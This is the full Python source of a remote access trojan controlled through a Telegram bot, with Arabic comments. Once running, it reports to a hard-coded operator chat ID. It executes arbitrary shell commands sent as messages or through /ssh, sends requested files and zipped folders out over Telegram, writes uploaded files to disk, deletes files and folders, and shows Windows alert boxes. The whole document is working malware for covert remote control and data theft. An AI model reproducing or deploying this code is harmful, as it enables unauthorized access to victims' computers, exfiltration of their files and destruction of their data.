import subprocess
import os
import shutil
import sys
import ctypes
import telebot
from platform import system, release

try:
    import telebot
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
    import telebot

uname = system().lower()

def sand_walcom(TOKEN, ID):
    TOKEN = TOKEN
    AUTHORIZED_USER_ID = ID
    bot = telebot.TeleBot(TOKEN)
    bot.send_message(AUTHORIZED_USER_ID, "Bot On Work ~ البوت شغال")

    def run_command(command):
        """تشغيل الأوامر العادية"""
        try:
            # تغيير المسار إذا كان الأمر cd
            if command.startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    os.chdir(new_dir)
                    return f"تم تغيير المسار إلى: {os.getcwd()}"
                except Exception as e:
                    return f"خطأ في تغيير المسار: {str(e)}"
            
            # تشغيل الأوامر الأخرى
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            if result.stdout:
                return result.stdout
            elif result.stderr:
                return result.stderr
            else:
                return "✔️ تم تنفيذ الأمر بنجاح"
        except Exception as e:
            return f"❌ خطأ: {str(e)}"

    @bot.message_handler(commands=['ssh'])
    def ssh_command(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        command = message.text[5:].strip()
        if command:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            bot.reply_to(message, result.stdout or result.stderr or "Command executed successfully")

    @bot.message_handler(commands=['get'])
    def get_file(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        file_path = message.text[5:].strip()
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file)
            bot.reply_to(message, f"File sent: {file_path}")
        else:
            bot.reply_to(message, "File not found.")

    @bot.message_handler(commands=['collect'])
    def collect_folder(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        folder_path = message.text[9:].strip()
        if os.path.isdir(folder_path):
            zip_filename = f"{folder_path.rstrip(os.sep)}.zip"
            shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', folder_path)
            with open(zip_filename, 'rb') as zip_file:
                bot.send_document(message.chat.id, zip_file)
            os.remove(zip_filename)
            bot.reply_to(message, f"Folder sent as ZIP file: {zip_filename}")
        else:
            bot.reply_to(message, "Folder not found.")

    @bot.message_handler(commands=['size'])
    def get_size(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        path = message.text[6:].strip()
        if os.path.isfile(path):
            file_size = os.path.getsize(path)
            bot.reply_to(message, f"File size: {file_size / 1024:.2f} KB")
        elif os.path.isdir(path):
            file_count = sum([len(files) for _, _, files in os.walk(path)])
            bot.reply_to(message, f"Number of files in the folder: {file_count}")
        else:
            bot.reply_to(message, "Invalid path or file not found.")

    @bot.message_handler(commands=['type'])
    def system_name(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        bot.reply_to(message, system())

    @bot.message_handler(commands=['list'])
    def list_dirs(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        path = message.text[6:].strip()
        if path == '': path = './'
        if os.path.isdir(path):
            try:
                buffer = os.listdir(path)
                files = ""
                for file in buffer:
                    files += f"{file} {'' if os.path.isfile(os.path.join(path, file)) else ' - Folder'}\n"
                bot.reply_to(message, files)
            except PermissionError:
                bot.reply_to(message, "Permission Denied")
        else:
            bot.reply_to(message, "Folder Not Found")

    @bot.message_handler(commands=['pwd', 'cwd'])
    def pwd(message): 
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        bot.reply_to(message, os.getcwd())

    @bot.message_handler(commands=['mkdir'])
    def create_dir(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        path = message.text[7:].strip()
        os.mkdir(path)
        bot.reply_to(message, "Folder has been Created")

    @bot.message_handler(commands=['del'])
    def delete(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        path = message.text[5:].strip()
        if os.path.isfile(path):
            os.remove(path)
            bot.reply_to(message, "File has been deleted")
        elif os.path.isdir(path):
            shutil.rmtree(path)
            bot.reply_to(message, "Folder has been deleted")
        else:
            bot.reply_to(message, "Target Error")

    @bot.message_handler(commands=['make'])
    def make_file(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        path = message.text[6:].strip()
        if os.path.isfile(path): 
            bot.reply_to(message, "File Already Exists")
        else:
            open(path, 'w').close()
            bot.reply_to(message, "File has been created")

    @bot.message_handler(content_types=['document'])
    def upload_file(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        path = message.caption.strip() if message.caption else './'
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name
        file_path = file_info.file_path
        downloaded_file = bot.download_file(file_path)
        save_location = os.path.join(path, file_name)
        with open(save_location, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, "File has been uploaded")

    @bot.message_handler(commands=['alert'])
    def show_info(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        if uname == 'windows':
            msg = message.text[6:].strip()
            bot.reply_to(message, "ALERT Dialog showing")
            ctypes.windll.user32.MessageBoxW(0, msg, "ALERT", 0x30)
            bot.reply_to(message, "ALERT Dialog has been showed")
        else:
            bot.reply_to(message, "Device Not Support")

    @bot.message_handler(commands=['isandroid'])
    def is_android(message):
        if str(message.chat.id) != str(AUTHORIZED_USER_ID):
            return
        print(release().lower())
        if "android" in release().lower(): 
            bot.reply_to(message, "Yes")
        else: 
            bot.reply_to(message, "No")

    # 🆕 معالجة الأوامر العادية (بدون /)
    @bot.message_handler(func=lambda message: True)
    def handle_all_messages(message):
        text = message.text.strip()
        
        # إذا كان أمر عادي (ليس /command)
        if text and not text.startswith('/'):
            if str(message.chat.id) != str(AUTHORIZED_USER_ID):
                bot.reply_to(message, "❌ غير مصرح لك باستخدام البوت")
                return
            
            # تشغيل الأمر
            output = run_command(text)
            bot.reply_to(message, f"```\n{output}\n```", parse_mode='Markdown')

    bot.infinity_polling()